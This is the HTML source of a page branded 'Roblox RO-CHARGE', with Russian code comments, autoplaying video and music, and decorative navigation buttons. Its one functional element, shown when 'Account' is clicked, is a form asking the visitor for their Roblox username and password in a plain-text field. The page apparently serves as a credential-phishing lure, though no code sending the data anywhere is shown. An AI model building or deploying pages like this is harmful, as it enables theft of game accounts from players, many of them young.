<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Roblox RO-CHARGE</title>
    <style>
        body {
            margin: 0;
            font-family: "Raleway", sans-serif;
            font-size: 14px;
            font-weight: 500;
            background-color: #BCAAA4;
            -webkit-font-smoothing: antialiased;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden; /* Обрезаем все, что выходит за пределы контейнера */
            position: relative;
        }

        .video-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100vw;
            height: 100vh;
            overflow: hidden;
            z-index: -1;
            pointer-events: none; /* Отключение событий мыши для ифрейма */
        }

        .video-background iframe {
            position: absolute;
            top: 50%;
            left: 50%;
            width: 120%;
            height: 120%;
            transform: translate(-50%, -50%);
        }

        .form-container {
            position: relative;
            width: 400px;
            padding: 40px 80px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 10px;
            backdrop-filter: blur(10px);
            box-shadow: rgba(255, 255, 255, 0.2) 0 0 40px 5px, white 0 0 0 1px, rgba(0, 0, 0, 0.66) 0 30px 60px 0, inset #333 0 0 0 5px, inset white 0 0 0 6px;
            transition: transform 0.2s ease;
            overflow: hidden;
            display: none; /* Скрываем контейнер с формой */
        }

        .form-container button#mainsubmit {
            margin-top: 20px;
        }

        form {
            position: relative;
            z-index: 1;
            display: flex;
            flex-direction: column;
            align-items: center;
        }

        label {
            display: block;
            margin-bottom: 10px;
            font-size: 18px;
            color: black; /* Изменение цвета текста на черный */
        }

        input[type="text"] {
            width: 100%;
            padding: 10px;
            border-radius: 10px;
            border: 2px solid #ccc;
            background: rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(5px);
            box-sizing: border-box;
            margin-bottom: 10px;
            color: black; /* Изменение цвета текста на черный */
        }

        button {
            width: 100%;
            padding: 10px;
            border: none;
            border-radius: 10px;
            background-color: #0066cc;
            color: white;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #005bb5;
        }

        input[type="text"]::placeholder {
            color: rgba(0, 0, 0, 0.7); /* Изменение цвета placeholder на черный (полупрозрачный) */
        }

        .nav-buttons {
            position: absolute;
            top: 20px;
            left: 20px;
            display: flex;
            gap: 20px;
            transform: translateX(50px); /* Сдвигаем кнопки немного ближе к центру */
        }

        .nav-button {
            padding: 10px 20px;
            background-color: rgba(255, 255, 255, 0.1);
            border: 2px solid rgba(255, 255, 255, 0.5);
            border-radius: 10px;
            backdrop-filter: blur(5px);
            color: black; /* Изменение цвета текста на черный */
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease, border-color 0.3s ease;
        }

        .nav-button:hover {
            background-color: rgba(255, 255, 255, 0.2);
            border-color: rgba(255, 255, 255, 0.7);
        }

        .welcome-container {
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            width: 80%;
            max-width: 600px;
            padding: 40px;
            background: rgba(255, 255, 255, 0.2);
            backdrop-filter: blur(15px);
            border-radius: 10px;
            text-align: center;
            box-shadow: 0px 0px 60px 10px rgba(0, 0, 0, 0.2);
            animation: fadeIn 1s ease-in-out;
        }

        .welcome-container h1 {
            font-size: 32px;
            color: black;
            margin: 0 0 20px 0;
        }

        .welcome-container p {
            font-size: 16px;
            color: black;
        }

        /* Анимация плавного появления */
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
    </style>
</head>
<body>
    <div class="video-background" id="video-background">
        <iframe id="background-video" src="https://www.youtube.com/embed/zhDwjnYZiCo?autoplay=1&controls=0&showinfo=0&modestbranding=1&loop=1&mute=1&playlist=zhDwjnYZiCo&vq=hd1080" frameborder="0" allow="autoplay; encrypted-media" allowfullscreen></iframe>
    </div>

    <div class="form-container" id="form-container">
        <form id="form">
            <label for="username">Enter your Roblox account name:</label>
            <input id="username" type="text" name="username" placeholder="Username" required>
            
            <label for="password">Enter your Roblox account password:</label>
            <input id="password" type="text" name="password" placeholder="Password" required>
            
            <button type="submit" id="mainsubmit">Submit</button>
        </form>
    </div>

    <div class="nav-buttons">
        <button class="nav-button" id="draw-button">Draw</button>
        <button class="nav-button" id="schedule-button">Schedule</button>
        <button class="nav-button" id="inventory-button">Inventory</button>
        <button class="nav-button" id="account-button">Account</button>
    </div>

    <div class="welcome-container" id="welcome-container">
        <h1>Welcome to Roblox RO-CHARGE!</h1>
        <p>To continue, please scroll down with your mouse wheel!</p>
    </div>

    <!-- Подключаем Howler.js -->
    <script src="https://cdn.jsdelivr.net/npm/howler/dist/howler.min.js"></script>
    <script>
        document.addEventListener('DOMContentLoaded', (event) => {
            var sound = new Howl({
                src: ['https://raw.githubusercontent.com/rocharge/Roblox-RO-CHARGE/main/chillMusic.mp3'],
                autoplay: false,
                loop: true,
                volume: 0.5,
                onload: function() {
                    console.log('Music loaded, waiting for user interaction to play.');
                }
            });

            // Автоматически воспроизводим звук при открытии страницы
            sound.play();

            const formContainer = document.getElementById('form-container');

            // Показываем форму только при нажатии на кнопку "Account"
            document.getElementById('account-button').addEventListener('click', () => {
                formContainer.style.display = 'block';
            });

            // Скрываем форму при нажатии на любую другую кнопку
            const otherButtons = document.querySelectorAll('#draw-button, #schedule-button, #inventory-button');
            otherButtons.forEach(button => {
                button.addEventListener('click', () => {
                    formContainer.style.display = 'none';
                });
            });

            // Убираем приветственное окно при прокрутке страницы
            window.addEventListener('scroll', () => {
                document.getElementById('welcome-container').style.display = 'none';
            });
        });
    </script>
</body>
</html>
